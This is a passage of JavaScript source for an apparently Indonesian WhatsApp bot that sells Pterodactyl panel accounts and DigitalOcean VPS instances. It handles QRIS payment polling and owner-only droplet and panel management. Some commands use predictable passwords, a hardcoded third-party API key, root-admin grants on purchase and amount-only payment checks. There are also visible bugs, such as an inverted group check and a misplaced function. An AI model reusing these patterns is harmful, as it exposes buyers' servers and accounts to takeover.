            3. 🚀 Gunakan Panel dengan Bijak!  
            4. 📸 Claim Garansi hanya dengan Bukti SS Chat Saat Pembelian.
            `;
            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null});
            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break

case "buyptpanel": {
    if (!m.isGroup) return m.reply("❌ *Pembelian Partner Panel Pterodactyl hanya bisa di dalam private chat!*");
    if (db.users[m.sender].status_deposit) return m.reply("⚠️ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    if (!text) return m.reply(example("username"));
    if (text.includes(" ")) return m.reply("⚠️ *Username tidak boleh memakai spasi!*");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "20000"; // Harga untuk panel publik
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 50);

    const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);

    const teks3 = `
    🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* PT Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "❌ QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);

        const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data;

        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
            🎉 *PEMBAYARAN BERHASIL DITERIMA ✅*

            📜 *ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}
            💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}
            🎁 *Barang:* Partner Panel Pterodactyl
            `}, {quoted: db.users[m.sender].saweria.msg});

            let username = Obj.username;
            let email = username + "@gmail.com";
            let name = capital(username);
            let password = crypto.randomBytes(4).toString('hex');

            let f = await fetch(global.domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username.toLowerCase(),
                    "first_name": name,
                    "last_name": "Admin",
                    "root_admin": true,
                    "language": "en",
                    "password": password.toString()
                })
            });

            let data = await f.json();
            if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;
            var teks = `
            🎉 *Berhasil Membuat Partner Panel ✅*

            📑 *ID:* ${user.id}
            👤 *Nama:* ${user.first_name}
            🏷 *Username:* ${user.username}
            🔑 *Password:* ${password.toString()}
            🌐 *Login:* ${global.domain}
            🗣 *Gabung Whatsapp:* ${global.linkgbbuypublic}

            *⚠️ Rules Partner Panel:*
            - Jangan Maling SC! Jika ketahuan, akun akan dihapus!
            - Simpan data akun ini dengan baik!
            - Gunakan panel seperlunya saja, jangan asal buat!
            - Untuk klaim garansi, wajib membawa bukti SS saat pembelian.
            `;

            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null});
            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}

break

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Nvidia.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Nvidia.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

case "listdroplet": {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Nvidia.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

case "restartvps": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

case "rebuild": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Nvidia.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

// Function to generate a random password
function generateRandomPassword(length = 12) {
 const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 let password = "";
 for (let i = 0; i < length; i++) {
 const randomIndex = Math.floor(Math.random() * charset.length);
 password += charset[randomIndex];
 }
 return password;
}
break

case "createvps": case "creatvps": case "cvps": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("host"))
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Sellect',
 sections: [
 {
 title: 'pilih ukuran',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'Ram 16 Core 4',
 id: `.r16c4 ${text}`
 },
 {
 title: 'Ram 1 Core 1',
 id: `.r1c1 ${text}`
 }, 
 {
 title: 'Ram 2 Core 1',
 id: `.r2c1 ${text}`
 }, 
 {
 title: 'Ram 2 Core 2',
 id: `.r2c2 ${text}`
 }, 
 {
 title: 'Ram 4 Core 2',
 id: `.r4c2 ${text}`
 }, 
 {
 title: 'Ram 8 Core 4',
 id: `.r8c4 ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "Pilih Ram Dan Core Untuk Pembuatan VPS (Virtual Privat Server).",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "nyc3"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "nyc3"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n`;
            messageText += `region: ${region}`;

            await Nvidia.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

case "produkvps": case "provps": {
let teks = `
*🌊BERIKUT PRODUK VPS DIGITAL OCEAN BY FR3🌊*

_*Promo Vps Digital Ocean🌟*_
* Ram 2 Core 2 Rp 18.000
* Ram 4 Core 2 Rp 25.000
* Ram 8 Core 4 Rp 35.000 (promo)
* Ram 16 Core 4 Rp 45.000 (promo
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req Domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 15 Hari
  1x Claim
>̶>̶ Free Install Thema 8-16 Ram

MINAT??? CHAT ME
wa.me/62882008771871`
Nvidia.sendMessage(m.chat, {image: {url: "https://img86.pixhost.to/images/536/563741061_fr3hosting.jpg"}, caption: teks, contextInfo: {
isForwarded: true, 
forwardingScore: 999
}}, {quoted: qlive})
}
break

case "creatpanel-v2": case "cpanel-v2": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: 'ini pesan interactiveMeta' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'PILIH',
          sections: [
            {
              title: 'List Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'unlimited-v2',
                  id: `.unli-v2 ${text}`
                },
                {
                  title: '1GB-v2',
                  id: `.1gb-v2 ${text}`
                },
                {
                  title: '2GB-v2',
                  id: `.2gb-v2 ${text}`
                },
                {
                  title: '4GB-v2',
                  id: `.4gb-v2 ${text}`
                },
                {
                  title: '5GB-v2',
                  id: `.5gb-v2 ${text}`
                },
                {
                  title: '6GB-v2',
                  id: `.6gb-v2 ${text}`
                },
                {
                  title: '7GB-v2',
                  id: `.7gb-v2 ${text}`
                },
                {
                  title: '8GB-v2',
                  id: `.8gb-v2 ${text}`
                },
                {
                  title: '9GB-v2',
                  id: `.9gb-v2 ${text}`
                },
                {
                  title: '10GB-v2',
                  id: `.10gb-v2 ${text}`
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  text: "PILIH RAM PANEL V2\n",
  contextInfo: {
    isForwarded: true,
    mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
  }
}, { quoted: m });
}
break

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@fr3.com"
let name = capital(username) + " Server"
let password = username+"FR3"
let f = await fetch(global.domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(global.domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(global.domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Nvidia.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Nvidia.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "delpanel-v2": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(global.domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(global.domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "creatpanel": case "cpanel": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: 'ini pesan interactiveMeta' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
